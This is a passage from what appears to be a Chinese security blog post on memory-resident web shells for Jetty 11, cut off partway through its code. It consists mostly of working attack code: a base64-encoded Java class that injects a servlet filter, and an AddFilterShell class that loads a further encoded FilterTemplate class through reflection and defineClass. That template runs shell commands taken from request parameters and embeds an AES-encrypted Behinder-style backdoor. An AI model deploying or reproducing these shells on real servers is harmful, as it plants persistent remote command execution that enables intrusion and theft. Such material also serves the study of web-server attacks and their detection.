UJwQUdvQUNRRjVBQVVBYXdCc0FBUUFBQUdLQUZFQVVnQUFBQUFCaWdCdEFHNEFBUUFBQVlvQWJ3QndBQUlBQUFHS0FIRUFjZ0FEQUhNQUFBQVpBQWo5QUdFSEFIUUhBSFVVK1FBbUF2c0EwMElIQUhZSkJ3QlhBQUFBQmdBQ0FIY0FXQUFCQUhnQVRRQUJBRTRBQUFBckFBQUFBUUFBQUFHeEFBQUFBZ0JQQUFBQUJnQUJBQUFBUEFCUUFBQUFEQUFCQUFBQUFRQlJBRklBQUFBQ0FIa0FBQUFDQUhvQVN3QUFBQW9BQVFBNEFFZ0FTZ0FBDABJAEoBABBqYXZhL2xhbmcvT2JqZWN0DAD5APoMAPsA/AwAdQB2AQAPX3NlcnZsZXRIYW5kbGVyDABDAEQMAP0AWAEAFmpha2FydGEvc2VydmxldC9GaWx0ZXIBABNfZmlsdGVyUGF0aE1hcHBpbmdzAQATamF2YS91dGlsL0FycmF5TGlzdAwA/gD/DAEAAO4BACZvcmcuZWNsaXBzZS5qZXR0eS5zZXJ2bGV0LkZpbHRlckhvbGRlcgwBAQECBwEDDADxAQQMAQUA/wEAEGphdmEvbGFuZy9TdHJpbmcMAEUARgEAJ29yZy5lY2xpcHNlLmpldHR5LnNlcnZsZXQuRmlsdGVyTWFwcGluZwwASABGDAEGAQcHAQgMAQkBCgEAAzEyMwcBCwwBDAENDAEOAQ8BAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24MARABEQEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24MAI4BDQwAjgBYDABXAFgMAGAAWAwAZQBYAQALY29tLkhGaWx0ZXIBAAIvKgEAJ2NvbS9ib29naXBvcC9tZW1zaGVsbC9JbmplY3RKZXR0eUZpbHRlcgEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBABhqYXZhL3V0aWwvQmFzZTY0JERlY29kZXIBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEACGdldEJ5dGVzAQAEKClbQgEAEGphdmEvdXRpbC9CYXNlNjQBAApnZXREZWNvZGVyAQAcKClMamF2YS91dGlsL0Jhc2U2NCREZWNvZGVyOwEABmRlY29kZQEABihbQilbQgEAEGphdmEvbGFuZy9UaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwEAFWdldENvbnRleHRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAlsb2FkQ2xhc3MBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAEWphdmEvbGFuZy9JbnRlZ2VyAQAEVFlQRQEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQAHdmFsdWVPZgEAFihJKUxqYXZhL2xhbmcvSW50ZWdlcjsBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA9wcmludFN0YWNrVHJhY2UBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAA5nZXRDbGFzc0xvYWRlcgEAFmdldERlY2xhcmVkQ29uc3RydWN0b3IBADMoW0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsBAB1qYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcgEAJyhbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEADWdldFN1cGVyY2xhc3MBAANhZGQBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZ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</span><br></pre></td></tr></table></figure>




<h1 id="Jetty11-内存马"><a href="#Jetty11-内存马" class="headerlink" title="Jetty11 内存马"></a>Jetty11 内存马</h1><p>其实是一模一样的</p>
<h2 id="Filter"><a href="#Filter" class="headerlink" title="Filter"></a>Filter</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.boogipop.memshell;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> jakarta.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Array;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AddFilterShell</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">servletHandler</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;FilterTemplate&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">filterClassName</span> <span class="operator">=</span> <span class="string">&quot;com.boogipop.memshell.FilterTemplate&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;/*&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">LoadFilter</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Thread.currentThread().getContextClassLoader().loadClass(filterClassName).newInstance();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            <span class="type">Method</span> <span class="variable">a</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, Integer.TYPE, Integer.TYPE);</span><br><span class="line">            a.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">byte</span>[] b = BASE64Decoder(<span class="string">&quot;yv66vgAAADQBJwoAQwCCCgAQAIMKAIQAhQoAYACGCQCHAIgIAIkKAIoAiwgAjAsAQACNCACOCgAQAI8KAJAAkQoAEACSCQCTAJQIAJUHAJYIAJcIAJgIAGkIAJkHAJoKAJsAnAoAmwCdCgCeAJ8KABUAoAgAoQoAFQCiCgAVAKMLAEEApAoApQCLBwCmCgCQAKcLAB8AqAsAHwCpCACqCgCQAKsLAB8ArAgArQsArgCvCACwCgCxALIHALMHALQKACsAggsArgC1CgArALYIALcKACsAuAoAKwC5CgAqALoKALEAuwsAQAC8CgC9AL4KAEgAvwoAsQDABwDBCgBDAMIKAD8AwwoAOADECgA4AMUKAD8AxggAxwcAyAcAyQcAygoAPwDLBwDMCgDNAM4HAM8KAEUA0AsA0QDSBwDTBwDUAQABVQEADElubmVyQ2xhc3NlcwEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAmTGNvbS9ib29naXBvcC9tZW1zaGVsbC9GaWx0ZXJUZW1wbGF0ZTsBAARpbml0AQAhKExqYWthcnRhL3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAeTGpha2FydGEvc2VydmxldC9GaWx0ZXJDb25maWc7AQAKRXhjZXB0aW9ucwcA1QEADUJBU0U2NERlY29kZXIBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAEZGF0YQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEACmlucHV0Qnl0ZXMBAAJbQgEAB2VuY29kZXIHANYBAAdEZWNvZGVyAQAaTGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcjsBAAxlbmNvZGVkQnl0ZXMBAAhkb0ZpbHRlcgEAYShMamFrYXJ0YS9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYWthcnRhL3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYWthcnRhL3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABnJlc3VsdAEAA2NtZAEAAWsBAAZjaXBoZXIBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAA5ldmlsQ2xhc3NCeXRlcwEACWV2aWxDbGFzcwEAEUxqYXZhL2xhbmcvQ2xhc3M7AQAKZXZpbE9iamVjdAEAEkxqYXZhL2xhbmcvT2JqZWN0OwEADHRhcmdldE1ldGhvZAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADnNlcnZsZXRSZXF1ZXN0AQAgTGpha2FydGEvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBACFMamFrYXJ0YS9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAHUxqYWthcnRhL3NlcnZsZXQvRmlsdGVyQ2hhaW47AQANU3RhY2tNYXBUYWJsZQcAZwcA1wEAB2Rlc3Ryb3kBAApTb3VyY2VGaWxlAQATRmlsdGVyVGVtcGxhdGUuamF2YQwATABNDADYANkHANoMANsA3AwA3QDeBwDfDADgAOEBAB1bK10gRHluYW1pYyBGaWx0ZXIgc2F5cyBoZWxsbwcA4gwA4wDkAQAEdHlwZQwA5QDmAQAFYmFzaWMMAMcA5wcA6AwA6QDqDADrAOwHAO0MAO4AXAEAAS8BABBqYXZhL2xhbmcvU3RyaW5nAQAHL2Jpbi9zaAEAAi1jAQACL0MBABFqYXZhL3V0aWwvU2Nhbm5lcgcA7wwA8ADxDADyAPMHAPQMAPUA9gwATAD3AQACXEEMAPgA+QwA+gDqDAD7APwHAP0BACdqYWthcnRhL3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QMAP4A6gwA/gDmDAD/AOoBAARQT1NUDAEAAOoMAQEBAgEAAXUHAQMMAQQBBQEAA0FFUwcBBgwBBwEIAQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyDAEJAQoMAQsBDAEAAAwBCwENDAEOAOoMAEwBDwwAUwEQDAERARIHARMMARQA6gwAWQBaDAEVAN4BACZjb20vYm9vZ2lwb3AvbWVtc2hlbGwvRmlsdGVyVGVtcGxhdGUkVQwBFgEXDAEYARkMAEwBGgwBGwEcDAEdAR4BAAZlcXVhbHMBAA9qYXZhL2xhbmcvQ2xhc3MBAB5qYWthcnRhL3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB9qYWthcnRhL3NlcnZsZXQvU2VydmxldFJlc3BvbnNlDAEfASABABBqYXZhL2xhbmcvT2JqZWN0BwEhDAEiASMBABNqYXZhL2xhbmcvRXhjZXB0aW9uDAEkAE0HASUMAGQBJgEAJGNvbS9ib29naXBvcC9tZW1zaGVsbC9GaWx0ZXJUZW1wbGF0ZQEAFmpha2FydGEvc2VydmxldC9GaWx0ZXIBACBqYWthcnRhL3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAGGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcgEAE2phdmEvaW8vSU9FeGNlcHRpb24BAAhnZXRCeXRlcwEABCgpW0IBABBqYXZhL3V0aWwvQmFzZTY0AQAKZ2V0RGVjb2RlcgEAHCgpTGphdmEvdXRpbC9CYXNlNjQkRGVjb2RlcjsBAAZkZWNvZGUBAAYoW0IpW0IBABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAFShMamF2YS9sYW5nL09iamVjdDspWgEAHGNvbS9ib29naXBvcC9tZW1zaGVsbC9Db25maWcBAAtnZXRQYXNzd29yZAEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAHaXNFbXB0eQEAAygpWgEADGphdmEvaW8vRmlsZQEACXNlcGFyYXRvcgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAEbmV4dAEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQATamF2YS9pby9QcmludFdyaXRlcgEACWdldEhlYWRlcgEACWdldE1ldGhvZAEAFmdldEJlaGluZGVyU2hlbGxQd2RQd2QBAApnZXRTZXNzaW9uAQAkKClMamFrYXJ0YS9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQAgamFrYXJ0YS9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb24BAAxzZXRBdHRyaWJ1dGUBACcoTGphdmEvbGFuZy9TdHJpbmc7TGphdmEvbGFuZy9PYmplY3Q7KVYBABNqYXZheC9jcnlwdG8vQ2lwaGVyAQALZ2V0SW5zdGFuY2UBACkoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEADGdldEF0dHJpYnV0ZQEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9PYmplY3Q7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAJZ2V0UmVhZGVyAQAaKClMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAIcmVhZExpbmUBAAdkb0ZpbmFsAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQBAKExjb20vYm9vZ2lwb3AvbWVtc2hlbGwvRmlsdGVyVGVtcGxhdGU7TGphdmEvbGFuZy9DbGFzc0xvYWRlcjspVgEAAWcBABUoW0IpTGphdmEvbGFuZy9DbGFzczsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQARZ2V0RGVjbGFyZWRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAPcHJpbnRTdGFja1RyYWNlAQAbamFrYXJ0YS9zZXJ2bGV0L0ZpbHRlckNoYWluAQBEKExqYWthcnRhL3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGpha2FydGEvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7KVYAIQBIAEMAAQBJAAAABQABAEwATQABAE4AAAAvAAEAAQAAAAUqtwABsQAAAAIATwAAAAYAAQAAAA4AUAAAAAwAAQAAAAUAUQBSAAAAAQBTAFQAAgBOAAAANQAAAAIAAAABsQAAAAIATwAAAAYAAQAAABIAUAAAABYAAgAAAAEAUQBSAAAAAAABAFUAVgABAFcAAAAEAAEAWAAKAFkAWgABAE4AAABlAAIABAAAABEqtgACTLgAA00sK7YABE4tsAAAAAIATwAAABIABAAAABQABQAVAAkAFgAPABcAUAAAACoABAAAABEAWwBcAAAABQAMAF0AXgABAAkACABfAGIAAgAPAAIAYwBeAAMAAQBkAGUAAgBOAAACvgAHAAoAAAGDsgAFEga2AAcrEgi5AAkCAMYAkCsSCLkACQIAEgq2AAuZAIAruAAMuQAJAgA6BBkExgBtGQS2AA2aAGUBOgWyAA4SD7YAC5kAGwa9ABBZAxIRU1kEEhJTWQUZBFM6BacAGAa9ABBZAxITU1kEEhRTWQUZBFM6BbsAFVm4ABYZBbYAF7YAGLcAGRIatgAbtgAcOgYsuQAdAQAZBrYAHqcA5SvAAB+4ACC5ACECAMYAzivAAB+5ACIBABIjtgALmQCwuAAkOgQrwAAfuQAlAQASJhkEuQAnAwASKLgAKToFGQUFuwAqWbsAK1m3ACwrwAAfuQAlAQASJrkALQIAtgAuEi+2ADC2ADG2AAISKLcAMrYAMxkFK7kANAEAtgA1uAA2tgA3Oga7ADhZKiq2ADm2ADq3ADsZBrYAPDoHGQe2AD06CBkHEj4FvQA/WQMSQFNZBBJBU7YAQjoJGQkZCAW9AENZAytTWQQsU7YARFenABU6BBkEtgBGpwALLSssuQBHAwCxAAEArwFtAXAARQADAE8AAABuABsAAAAcAAgAHgAjACAALgAhADsAIgA+ACMASQAkAGEAJgB2ACgAkgApAJ0AKwCvAC4AwAAvAMUAMADXADEA3gAyARIAMwElADQBOwA1AUIANgFZADcBbQA7AXAAOQFyADoBdwA7AXoAPQGCAD8AUAAAAI4ADgA+AF8AZgBnAAUAkgALAGgAXAAGAC4AbwBpAFwABADFAKgAagBcAAQA3gCPAGsAbAAFASUASABtAF4ABgE7ADIAbgBvAAcBQgArAHAAcQAIAVkAFAByAHMACQFyAAUAdAB1AAQAAAGDAFEAUgAAAAABgwB2AHcAAQAAAYMAeAB5AAIAAAGDAHoAewADAHwAAAAZAAj9AGEHABAHAH0U+QAmAvsAzEIHAEUJBwBXAAAABgACAH4AWAABAH8ATQABAE4AAAArAAAAAQAAAAGxAAAAAgBPAAAABgABAAAARABQAAAADAABAAAAAQBRAFIAAAACAIAAAAACAIEASwAAABIAAgA4AEgASgAAAGAAhABhAAk=&quot;</span>);</span><br><span class="line">            a.invoke(Thread.currentThread().getContextClassLoader(), b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] BASE64Decoder(String data)&#123;</span><br><span class="line">        <span class="type">byte</span>[] inputBytes = data.getBytes();</span><br><span class="line">        Base64.<span class="type">Decoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getDecoder();</span><br><span class="line">        <span class="type">byte</span>[] encodedBytes = encoder.decode(inputBytes);</span><br><span class="line">        <span class="keyword">return</span> encodedBytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取上下文</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">GetWebContent</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">currentThread</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> GetField(currentThread, <span class="string">&quot;contextClassLoader&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span 